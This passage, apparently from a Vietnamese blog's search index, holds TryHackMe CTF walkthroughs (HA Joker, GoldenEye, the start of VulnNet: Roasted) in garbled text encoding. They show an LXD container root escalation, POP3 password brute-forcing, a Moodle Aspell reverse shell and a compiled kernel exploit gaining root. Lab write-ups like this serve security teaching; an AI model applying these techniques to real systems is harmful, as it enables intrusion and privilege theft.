privesc\nwww-data@ubuntu:/tmp$ lxc image import ./alpine-v3.17-x86_64-20221226_2308.tar.gz --alias privesc \u0026lt;e-v3.17-x86_64-20221226_2308.tar.gz --alias privesc Image imported with fingerprint: 6f955b8c349dff3536f22249c66a037f172efcc113b97a54cf35ccb380631654 Kiá»ƒm tra xem image Ä‘Ã£ import thÃ nh cÃ´ng chÆ°a\nwww-data@ubuntu:/tmp$ lxc image list lxc image list +---------+--------------+--------+-------------------------------+--------+--------+------------------------------+ | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE | +---------+--------------+--------+-------------------------------+--------+--------+------------------------------+ | privesc | 6f955b8c349d | no | alpine v3.17 (20221226_23:08) | x86_64 | 3.60MB | Dec 27, 2022 at 8:31am (UTC) | +---------+--------------+--------+-------------------------------+--------+--------+------------------------------+ Táº¡o container má»›i cÃ³ tÃªn priv tá»« image privesc\nwww-data@ubuntu:/tmp$ lxc init privesc priv -c security.privileged=true lxc init privesc priv -c security.privileged=true Creating priv Mount container vá»«a táº¡o Ä‘áº¿n thÆ° má»¥c root\nwww-data@ubuntu:/tmp$ lxc config device add priv mydevice disk source=/ path=/mnt/root recursive=true \u0026lt;ydevice disk source=/ path=/mnt/root recursive=true Device mydevice added to priv BÃ¢y giá» thÃ¬ cháº¡y container nÃ y\nwww-data@ubuntu:/tmp$ lxc start priv lxc start priv www-data@ubuntu:/tmp$ lxc exec priv /bin/sh lxc exec priv /bin/sh ~ id id uid=0(root) gid=0(root) ~ ls /mnt/root/root ls /mnt/root/root final.txt ~ cat /mnt/root/root/final.txt â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â•â• â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•— â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â•šâ•â•â•â•â• â•šâ•â•â•â•â•â• â•šâ•â• â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â• â•šâ•â• !! Congrats you have finished this task !! Contact us here: Hacking Articles : https://twitter.com/rajchandel/ Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114 +-+-+-+-+-+ +-+-+-+-+-+-+-+ |E|n|j|o|y| |H|A|C|K|I|N|G| +-+-+-+-+-+ +-+-+-+-+-+-+-+ ","date":"1 May 2022","externalUrl":null,"permalink":"/ctf/tryhackme/ha-joker-ctf/","section":"Ctf","summary":"","title":"Tryhackme - HA Joker CTF","type":"ctf"},{"content":"","date":"19 April 2022","externalUrl":null,"permalink":"/tags/moodle/","section":"Tags","summary":"","title":"Moodle","type":"tags"},{"content":"","date":"19 April 2022","externalUrl":null,"permalink":"/tags/pop3/","section":"Tags","summary":"","title":"Pop3","type":"tags"},{"content":"","date":"19 April 2022","externalUrl":null,"permalink":"/tags/telnet/","section":"Tags","summary":"","title":"Telnet","type":"tags"},{"content":"Xin chÃ o, láº¡i lÃ  tÃ´i Ä‘Ã¢y. HÃ´m nay tÃ´i sáº½ giáº£i CTF TryHackMe | GoldenEye\nReconnaissance # Viá»‡c Ä‘áº§u tiÃªn lÃ  quÃ©t cÃ¡c port Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu\nPORT STATE SERVICE REASON VERSION 25/tcp open smtp syn-ack Postfix smtpd | ssl-cert: Subject: commonName=ubuntu | Issuer: commonName=ubuntu | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2018-04-24T03:22:34 | Not valid after: 2028-04-21T03:22:34 | MD5: cd4ad178f21617fb21a60a168f46c8c6 | SHA-1: fda3fc7b6601474696aa0f56b1261c2936e8442c | -----BEGIN CERTIFICATE----- | MIICsjCCAZqgAwIBAgIJAPokpqPNVgk6MA0GCSqGSIb3DQEBCwUAMBExDzANBgNV | BAMTBnVidW50dTAeFw0xODA0MjQwMzIyMzRaFw0yODA0MjEwMzIyMzRaMBExDzAN | BgNVBAMTBnVidW50dTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMM6 | ryxPHxf2wYf7DNTXnW6Hc6wK+O6/3JVeWME041jJdsY2UpxRB6cTmBIv7dAOHZzL | eSVCfH1P3IS0dvSrqkA+zpPRK3to3SuirknpbPdmsNqMG1SiKLDl01o5LBDgIpcY | V9JNNjGaxYBlyMjvPDDvgihmJwpb81lArUqDrGJIsIH8J6tqOdLt4DGBXU62sj// | +IUE4w6c67uMAYQD26ZZH9Op+qJ3OznCTXwmJslIHQLJx+fXG53+BLiV06EGrsOk | ovnPmixShoaySAsoGm56IIHQUWrCQ03VYHfhCoUviEw02q8oP49PHR1twt+mdj6x | qZOBlgwHMcWgb1Em40UCAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF | AAOCAQEAfigEwPIFEL21yc3LIzPvHUIvBM5/fWEEv0t+8t5ATPfI6c2Be6xePPm6 | W3bDLDQ30UDFmZpTLgLkfAQRlu4N40rLutTHiAN6RFSdAA8FEj72cwcX99S0kGQJ | vFCSipVd0fv0wyKLVwbXqb1+JfmepeZVxWFWjiDg+JIBT3VmozKQtrLLL/IrWxGd | PI2swX8KxikRYskNWW1isMo2ZXXJpdQJKfikSX334D9oUnSiHcLryapCJFfQa81+ | T8rlFo0zan33r9BmA5uOUZ7VlYF4Kn5/soSE9l+JbDrDFOIOOLLILoQUVZcO6rul | mJjFdmZE4k3QPKz1ksaCAQkQbf3OZw== |_-----END CERTIFICATE----- |_ssl-date: TLS randomness does not represent time |_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN 80/tcp open http syn-ack Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: GoldenEye Primary Admin Server | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 55006/tcp open ssl/pop3 syn-ack Dovecot pop3d | ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost | Issuer: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2018-04-24T03:23:52 | Not valid after: 2028-04-23T03:23:52 | MD5: d0392e71c76a2cb3e694ec407228ec63 | SHA-1: 9d6a92eb5f9fe9ba6cbddc9355fa5754219b0b77 | -----BEGIN CERTIFICATE----- | MIIDnTCCAoWgAwIBAgIJAOZHv9ZnCiJ+MA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV | BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG | A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe | Fw0xODA0MjQwMzIzNTJaFw0yODA0MjMwMzIzNTJaMGUxHDAaBgNVBAoME0RvdmVj | b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j | YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI | hvcNAQEBBQADggEPADCCAQoCggEBAMo64gzxBeOvt+rgUQncWU2OJESGR5YJ9Mcd | h0nF6m0o+zXwvkSx+SW5I3I/mpJugQfsc2lW4txo3xoAbvVgc2kpkkna8ojodTS3 | iUyKXwN3y2KG/jyBcrH+rZcs5FIpt5tDB/F1Uj0cdAUZ+J/v2NEw1w+KjlX2D0Zr | xpgnJszmEMJ3DxNBc8+JiROMT7V8iYu9/Cd8ulAdS8lSPFE+M9/gZBsRbzRWD3D/ | OtDaPzBTlb6es4NfrfPBanD7zc8hwNL5AypUG/dUhn3k3rjUNplIlVD1lSesI+wM | 9bIIVo3IFQEqiNnTdFVz4+EOr8hI7SBzsXTOrxtH23NQ6MrGbLUCAwEAAaNQME4w | HQYDVR0OBBYEFFGO3VTitI69jNHsQzOz/7wwmdfaMB8GA1UdIwQYMBaAFFGO3VTi | tI69jNHsQzOz/7wwmdfaMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB | AMm4cTA4oSLGXG+wwiJWD/2UjXta7XAAzXofrDfkRmjyPhMTsuwzfUbU+hHsVjCi | CsjV6LkVxedX4+EQZ+wSa6lXdn/0xlNOk5VpMjYkvff0ODTGTmRrKgZV3L7K/p45 | FI1/vD6ziNUlaTzKFPkmW59oGkdXfdJ06Y7uo7WQALn2FI2ZKecDSK0LonWnA61a | +gXFctOYRnyMtwiaU2+U49O8/vSDzcyF0wD5ltydCAqCdMTeeo+9DNa2u2IOZ4so | yPyR+bfnTC45hue/yiyOfzDkBeCGBqXFYcox+EUm0CPESYYNk1siFjjDVUNjPGmm | e1/vPH7tRtldZFSfflyHUsA= |_-----END CERTIFICATE----- |_ssl-date: TLS randomness does not represent time |_pop3-capabilities: CAPA SASL(PLAIN) RESP-CODES UIDL TOP USER AUTH-RESP-CODE PIPELINING 55007/tcp open pop3 syn-ack Dovecot pop3d |_pop3-capabilities: CAPA RESP-CODES SASL(PLAIN) AUTH-RESP-CODE UIDL TOP STLS USER PIPELINING | ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost | Issuer: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2018-04-24T03:23:52 | Not valid after: 2028-04-23T03:23:52 | MD5: d0392e71c76a2cb3e694ec407228ec63 | SHA-1: 9d6a92eb5f9fe9ba6cbddc9355fa5754219b0b77 | -----BEGIN CERTIFICATE----- | MIIDnTCCAoWgAwIBAgIJAOZHv9ZnCiJ+MA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV | BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG | A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe | Fw0xODA0MjQwMzIzNTJaFw0yODA0MjMwMzIzNTJaMGUxHDAaBgNVBAoME0RvdmVj | b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j | YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI | hvcNAQEBBQADggEPADCCAQoCggEBAMo64gzxBeOvt+rgUQncWU2OJESGR5YJ9Mcd | h0nF6m0o+zXwvkSx+SW5I3I/mpJugQfsc2lW4txo3xoAbvVgc2kpkkna8ojodTS3 | iUyKXwN3y2KG/jyBcrH+rZcs5FIpt5tDB/F1Uj0cdAUZ+J/v2NEw1w+KjlX2D0Zr | xpgnJszmEMJ3DxNBc8+JiROMT7V8iYu9/Cd8ulAdS8lSPFE+M9/gZBsRbzRWD3D/ | OtDaPzBTlb6es4NfrfPBanD7zc8hwNL5AypUG/dUhn3k3rjUNplIlVD1lSesI+wM | 9bIIVo3IFQEqiNnTdFVz4+EOr8hI7SBzsXTOrxtH23NQ6MrGbLUCAwEAAaNQME4w | HQYDVR0OBBYEFFGO3VTitI69jNHsQzOz/7wwmdfaMB8GA1UdIwQYMBaAFFGO3VTi | tI69jNHsQzOz/7wwmdfaMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB | AMm4cTA4oSLGXG+wwiJWD/2UjXta7XAAzXofrDfkRmjyPhMTsuwzfUbU+hHsVjCi | CsjV6LkVxedX4+EQZ+wSa6lXdn/0xlNOk5VpMjYkvff0ODTGTmRrKgZV3L7K/p45 | FI1/vD6ziNUlaTzKFPkmW59oGkdXfdJ06Y7uo7WQALn2FI2ZKecDSK0LonWnA61a | +gXFctOYRnyMtwiaU2+U49O8/vSDzcyF0wD5ltydCAqCdMTeeo+9DNa2u2IOZ4so | yPyR+bfnTC45hue/yiyOfzDkBeCGBqXFYcox+EUm0CPESYYNk1siFjjDVUNjPGmm | e1/vPH7tRtldZFSfflyHUsA= |_-----END CERTIFICATE----- |_ssl-date: TLS randomness does not represent time CÃ³ 4 port Ä‘ang má»Ÿ.\nEnumeration # VÃ¬ cÃ³ port 80 nÃªn tÃ´i sáº½ báº¯t Ä‘áº§u vá»›i web trÆ°á»›c.\nTÃ¬m kiáº¿m trong source web tÃ´i cÃ³ 1 file js\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;GoldenEye Primary Admin Server\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;[index.css](view-source:http://10.10.169.41/index.css)\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;span id=\u0026#34;GoldenEyeText\u0026#34; class=\u0026#34;typeing\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#39;blinker\u0026#39;\u0026gt;\u0026amp;#32;\u0026lt;/span\u0026gt; \u0026lt;script src=\u0026#34;[terminal.js](view-source:http://10.10.169.41/terminal.js)\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; Truy cáº­p vÃ o file js nÃ y tÃ´i tÃ¬m Ä‘Æ°á»£c vÃ i thá»© thÃº vá»‹\nvar data = [ { GoldenEyeText: \u0026#34;\u0026lt;span\u0026gt;\u0026lt;br/\u0026gt;Severnaya Auxiliary Control Station\u0026lt;br/\u0026gt;****TOP SECRET ACCESS****\u0026lt;br/\u0026gt;Accessing Server Identity\u0026lt;br/\u0026gt;Server Name:....................\u0026lt;br/\u0026gt;GOLDENEYE\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt;User: UNKNOWN\u0026lt;br/\u0026gt;\u0026lt;span\u0026gt;Naviagate to /sev-home/ to login\u0026lt;/span\u0026gt;\u0026#34; } ]; // //Boris, make sure you update your default password. //My sources say MI6 maybe planning to infiltrate. //Be on the lookout for any suspicious network traffic.... // //I encoded you p@ssword below... // //\u0026amp;#73;\u0026amp;#110;\u0026amp;#118;\u0026amp;#105;\u0026amp;#110;\u0026amp;#99;\u0026amp;#105;\u0026amp;#98;\u0026amp;#108;\u0026amp;#101;\u0026amp;#72;\u0026amp;#97;\u0026amp;#99;\u0026amp;#107;\u0026amp;#51;\u0026amp;#114; // //BTW Natalya says she can break your codes // var allElements = document.getElementsByClassName(\u0026#34;typeing\u0026#34;); for (var j = 0; j \u0026lt; allElements.length; j++) { var currentElementId = allElements[j].id; var currentElementIdContent = data[0][currentElementId]; var element = document.getElementById(currentElementId); var devTypeText = currentElementIdContent; var i = 0, isTag, text; (function type() { text = devTypeText.slice(0, ++i); if (text === devTypeText) return; element.innerHTML = text + `\u0026lt;span class=\u0026#39;blinker\u0026#39;\u0026gt;\u0026amp;#32;\u0026lt;/span\u0026gt;`; var char = text.slice(-1); if (char === \u0026#34;\u0026lt;\u0026#34;) isTag = true; if (char === \u0026#34;\u0026gt;\u0026#34;) isTag = false; if (isTag) return type(); setTimeout(type, 60); })(); } NgÆ°á»i pháº£i thay Ä‘á»•i password lÃ  Boris.\nVÃ  khi giáº£i mÃ£ Ä‘oáº¡n code vá»›i HTML decoder, tÃ´i tÃ¬m Ä‘Æ°á»£c password cá»§a anh ta.\nTruy cáº­p vÃ o path /sev-home/ vÃ  login báº±ng username vÃ  password vá»«a tÃ¬m Ä‘Æ°á»£c\nThá»­ vÃ o source web xem cÃ³ gÃ¬ Ä‘áº·c biá»‡t khÃ´ng\n\u0026lt;/video\u0026gt; \u0026lt;div id=\u0026#34;golden\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;GoldenEye\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO) \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Please email a qualified GNO supervisor to receive the online \u0026lt;b\u0026gt;GoldenEye Operators Training\u0026lt;/b\u0026gt; to become an Administrator of the GoldenEye system\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Remember, since \u0026lt;b\u0026gt;\u0026lt;i\u0026gt;security by obscurity\u0026lt;/i\u0026gt;\u0026lt;/b\u0026gt; is very effective, we have configured our pop3 service to run on a very high non-default port\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; ... Qualified GoldenEye Network Operator Supervisors: Natalya Boris Äá»ƒ Ã½ 1 chÃºt khi cÃ³ nháº¯c Ä‘áº¿n pop3. TÃ´i sáº½ thá»­ khai thÃ¡c qua email\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ telnet 10.10.52.162 55007 Trying 10.10.52.162... Connected to 10.10.52.162. Escape character is \u0026#39;^]\u0026#39;. +OK GoldenEye POP3 Electronic-Mail System user boris +OK pass InvincibleHack3r -ERR [AUTH] Authentication failed. KhÃ´ng kháº£ thi cho láº¯m. Tuy nhiÃªn tÃ´i cÃ²n 1 cÃ¡i tÃªn ná»¯a lÃ  natalya, vÃ  Ä‘á»ƒ tÃ¬m Ä‘Æ°á»£c password cá»§a user nÃ y thÃ¬ tÃ´i láº¡i quay vá» cÃ¡ch Ä‘Æ¡n giáº£n nháº¥t thÃ´i - bruteforce.\n[55007][pop3] host: 10.10.52.162 login: natalya password: bird\nTÃ´i cÅ©ng sáº½ thá»­ láº¡i vá»›i user boris vÃ¬ cÃ³ thá»ƒ pass phÃ­a trÃªn khÃ´ng pháº£i pass Ä‘á»ƒ login pop3\n[55007][pop3] host: 10.10.52.162 login: boris password: secret1!\nLogin láº¡i pop3\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ telnet 10.10.52.162 55007 Trying 10.10.52.162... Connected to 10.10.52.162. Escape character is \u0026#39;^]\u0026#39;. +OK GoldenEye POP3 Electronic-Mail System user natalya +OK pass bird +OK Logged in. list +OK 2 messages: 1 631 2 1048 Message 1\nretr 1 +OK 631 octets Return-Path: \u0026lt;root@ubuntu\u0026gt; X-Original-To: natalya Delivered-To: natalya@ubuntu Received: from ok (localhost [127.0.0.1]) by ubuntu (Postfix) with ESMTP id D5EDA454B1 for \u0026lt;natalya\u0026gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT) Message-Id: \u0026lt;20180425024542.D5EDA454B1@ubuntu\u0026gt; Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT) From: root@ubuntu Natalya, please you need to stop breaking boris\u0026#39; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you. Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus. . Message 2\nretr 2 +OK 1048 octets Return-Path: \u0026lt;root@ubuntu\u0026gt; X-Original-To: natalya Delivered-To: natalya@ubuntu Received: from root (localhost [127.0.0.1]) by ubuntu (Postfix) with SMTP id 17C96454B1 for \u0026lt;natalya\u0026gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT) Message-Id: \u0026lt;20180425031956.17C96454B1@ubuntu\u0026gt; Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT) From: root@ubuntu Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it\u0026#39;s related to security...even if it\u0026#39;s not, just enter it in under the guise of \u0026#34;security\u0026#34;...it\u0026#39;ll get the change order escalated without much hassle :) Ok, user creds are: username: xenia password: RCP90rulez! Boris verified her as a valid contractor so just create the account ok? And if you didn\u0026#39;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir **Make sure to edit your host file since you usually work remote off-network.... Since you\u0026#39;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts. Theo nhÆ° message 2, tÃ´i pháº£i thÃªm domain vÃ o file hosts vÃ  vÃ o domain severnaya-station.com/gnocertdir Ä‘á»ƒ login vá»›i user vÃ  password phÃ­a trÃªn\nSau khi Ä‘Ã£ thÃªm domain vÃ  hosts vÃ  truy cáº­p url, tÃ´i Ä‘Æ°á»£c 1 trang web sá»­ dá»¥ng Moodle LMS.\nÄÄƒng nháº­p báº±ng user vÃ  pass á»Ÿ phÃ­a trÃªn, vÃ o Ä‘Æ°á»£c user nÃ y tÃ´i cÃ³ 1 message chÆ°a Ä‘á»c\ná» Ä‘Ã¢y tÃ´i cÃ²n cÃ³ thÃªm 1 user ná»¯a tÃªn lÃ  Doak. Thá»­ bruteforce user nÃ y luÃ´n\n[55007][pop3] host: 10.10.52.162 login: doak password: goat\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ telnet 10.10.52.162 55007 Trying 10.10.52.162... Connected to 10.10.52.162. Escape character is \u0026#39;^]\u0026#39;. +OK GoldenEye POP3 Electronic-Mail System user doak +OK pass goat +OK Logged in. list +OK 1 messages: 1 606 . retr 1 +OK 606 octets Return-Path: \u0026lt;doak@ubuntu\u0026gt; X-Original-To: doak Delivered-To: doak@ubuntu Received: from doak (localhost [127.0.0.1]) by ubuntu (Postfix) with SMTP id 97DC24549D for \u0026lt;doak\u0026gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT) Message-Id: \u0026lt;20180425034731.97DC24549D@ubuntu\u0026gt; Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT) From: doak@ubuntu James, If you\u0026#39;re reading this, congrats you\u0026#39;ve gotten this far. You know how tradecraft works right? Because I don\u0026#39;t. Go to our training site and login to my account....dig until you can exfiltrate further information...... username: dr_doak password: 4England! Login moodle vá»›i user nÃ y. Dáº¡o quanh 1 chÃºt tÃ´i tÃ¬m tháº¥y 1 file cÃ³ tÃªn s3cret.txt bÃªn trong pháº§n My private files. Táº£i file Ä‘Ã³ vá»\n*007,\n*I was able to capture this apps adm1n cr3ds through clear txt.\n*Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.\n*Something juicy is located here: /dir007key/for-007.jpg\nAlso as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.\nTáº£i áº£nh theo Ä‘Æ°á»ng dáº«n trÃªn vá» vÃ  phÃ¢n tÃ­ch\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ exiftool for-007.jpg ExifTool Version Number : 12.51 File Name : for-007.jpg Directory : . File Size : 15 kB File Modification Date/Time : 2018:04:24 20:40:02-04:00 File Access Date/Time : 2022:12:27 23:35:57-05:00 File Inode Change Date/Time : 2022:12:27 23:35:47-05:00 File Permissions : -rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.01 X Resolution : 300 Y Resolution : 300 Exif Byte Order : Big-endian (Motorola, MM) Image Description : eFdpbnRlcjE5OTV4IQ== Make : GoldenEye Resolution Unit : inches Software : linux Artist : For James Y Cb Cr Positioning : Centered Exif Version : 0231 Components Configuration : Y, Cb, Cr, - User Comment : For 007 Flashpix Version : 0100 Image Width : 313 Image Height : 212 Encoding Process : Baseline DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:4:4 (1 1) Image Size : 313x212 Megapixels : 0.066 â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ echo eFdpbnRlcjE5OTV4IQ== | base64 -d xWinter1995x! ÄÄƒng nháº­p moodle vá»›i user admin vÃ  pass lÃ  Ä‘oáº¡n code tÃ´i vá»«a tÃ¬m Ä‘Æ°á»£c.\nRCE # Tiáº¿p theo pháº£i tÃ¬m cÃ¡ch Ä‘á»ƒ láº¥y RCE.\nTheo nhÆ° trong pháº§n hÆ°á»›ng dáº«n trong task, tÃ¬m Ä‘áº¿n Aspell, sau Ä‘Ã³ Ä‘á»•i Spell engine thÃ nh PSpellShell vÃ  thay Ä‘á»•i Path to aspell thÃ nh reverse shell chá»©a IP vÃ  port mÃ  tÃ´i muá»‘n gá»i vá» mÃ¡y local.\nBÃ¢y giá» Ä‘á»ƒ kÃ­ch hoáº¡t Ä‘Æ°á»£c shell nÃ y, tÃ´i pháº£i thá»±c hiá»‡n spell check vÃ  server sáº½ gá»i spellpath mÃ  tÃ´i Ä‘Ã£ thay Ä‘á»•i thÃ nh shell ban nÃ£y.\nTrÆ°á»›c khi spell check thÃ¬ cáº§n táº¡o listener vá»›i port vá»«a cáº¥u hÃ¬nh trong shell\nNavigation -\u0026gt; Home -\u0026gt; My Profile -\u0026gt; Blogs -\u0026gt; Add a new entry\náº¤n vÃ o dáº¥u tÃ­ch xanh ABC trÃªn thanh cÃ´ng cá»¥ vÃ  quay láº¡i listener\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/CVE-2020-14321] â””â”€$ nc -lnvp 9001 listening on [any] 9001 ... connect to [10.6.0.191] from (UNKNOWN) [10.10.165.144] 44411 $ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ uname -a uname -a Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux $ Privilege escalation # Tiáº¿p theo, cÅ©ng trong pháº§n mÃ´ táº£ cá»§a task, tÃ´i sáº½ táº£i exploit 37292 vá» Ä‘á»ƒ Ä‘áº©y nÃ³ lÃªn mÃ¡y remote vÃ  dÃ¹ng gcc Ä‘á»ƒ complie nÃ³.\n$ gcc 37292.c -o exploit gcc 37292.c -o exploit /bin/sh: 11: gcc: not found MÃ¡y nÃ y khÃ´ng cÃ³ gcc, váº­y thÃ¬ tÃ´i sáº½ thá»­ dÃ¹ng cc\n$ cc 37292.c -o exploit cc 37292.c -o exploit 37292.c:94:1: warning: control may reach end of non-void function [-Wreturn-type] } ^ 37292.c:106:12: warning: implicit declaration of function \u0026#39;unshare\u0026#39; is invalid in C99 [-Wimplicit-function-declaration] if(unshare(CLONE_NEWUSER) != 0) ^ 37292.c:111:17: warning: implicit declaration of function \u0026#39;clone\u0026#39; is invalid in C99 [-Wimplicit-function-declaration] clone(child_exec, child_stack + (1024*1024), clone_flags, NULL); ^ 37292.c:117:13: warning: implicit declaration of function \u0026#39;waitpid\u0026#39; is invalid in C99 [-Wimplicit-function-declaration] waitpid(pid, \u0026amp;status, 0); ^ 37292.c:127:5: warning: implicit declaration of function \u0026#39;wait\u0026#39; is invalid in C99 [-Wimplicit-function-declaration] wait(NULL); ^ 5 warnings generated. $ ./exploit ./exploit spawning threads mount #1 mount #2 child threads done /etc/ld.so.preload created creating shared library # id id uid=0(root) gid=0(root) groups=0(root),33(www-data) # ls -la /root ls -la /root total 44 drwx------ 3 root root 4096 Apr 29 2018 . drwxr-xr-x 22 root root 4096 Apr 24 2018 .. -rw-r--r-- 1 root root 19 May 3 2018 .bash_history -rw-r--r-- 1 root root 3106 Feb 19 2014 .bashrc drwx------ 2 root root 4096 Apr 28 2018 .cache -rw------- 1 root root 144 Apr 29 2018 .flag.txt -rw-r--r-- 1 root root 140 Feb 19 2014 .profile -rw------- 1 root root 1024 Apr 23 2018 .rnd -rw------- 1 root root 8296 Apr 29 2018 .viminfo ","date":"19 April 2022","externalUrl":null,"permalink":"/ctf/tryhackme/goldeneye/","section":"Ctf","summary":"","title":"Tryhackme - GoldenEye","type":"ctf"},{"content":"","date":"13 April 2022","externalUrl":null,"permalink":"/tags/impacket/","section":"Tags","summary":"","title":"Impacket","type":"tags"},{"content":"","date":"13 April 2022","externalUrl":null,"permalink":"/tags/smb/","section":"Tags","summary":"","title":"Smb","type":"tags"},{"content":"Xin chÃ o, láº¡i lÃ  tÃ´i Ä‘Ã¢y. HÃ´m nay tÃ´i sáº½ giáº£i CTF TryHackMe | VulnNet: Roasted\nReconnaissance # NhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y má»¥c tiÃªu.\nOpen 10.10.15.106:88 Open 10.10.15.106:135 Open 10.10.15.106:139 Open 10.10.15.106:445 Open 10.10.15.106:389 Open 10.10.15.106:464 Open 10.10.15.106:593 Open 10.10.15.106:636 Open 10.10.15.106:3268 Open 10.10.15.106:3269 Open 10.10.15.106:49684 Open 10.10.15.106:49697 Open 10.10.15.106:49669 Open 